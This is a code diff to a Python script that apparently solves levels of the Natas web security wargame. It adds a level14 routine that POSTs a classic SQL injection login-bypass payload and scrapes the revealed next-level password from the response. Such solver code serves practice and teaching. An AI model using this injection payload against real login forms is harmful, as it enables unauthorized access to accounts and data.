@@ -276,6 +276,24 @@ def level12():
         else:
             print(" Password not found")        
 
+def level14():
+    p = "username=\" or \"\" = \"&password=\" or \"\" = \""
+    print(" SQL injection {}".format(p))
+    res, reg = rex(
+        "POST",
+        "/index.php",
+        "The password for natas15 is (\w+)<br>",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        body=p,
+    )
+
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")        
+
 def levelN():
     print("Level {} not implemented yet".format(level))
     return
@@ -284,7 +302,7 @@ levels = [
     level0, level0, level2, level2,
     level4, level5, level6, level7,
     level8, level9, level9, level11,
-    level12, level12, levelN, levelN,
+    level12, level12, level14, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
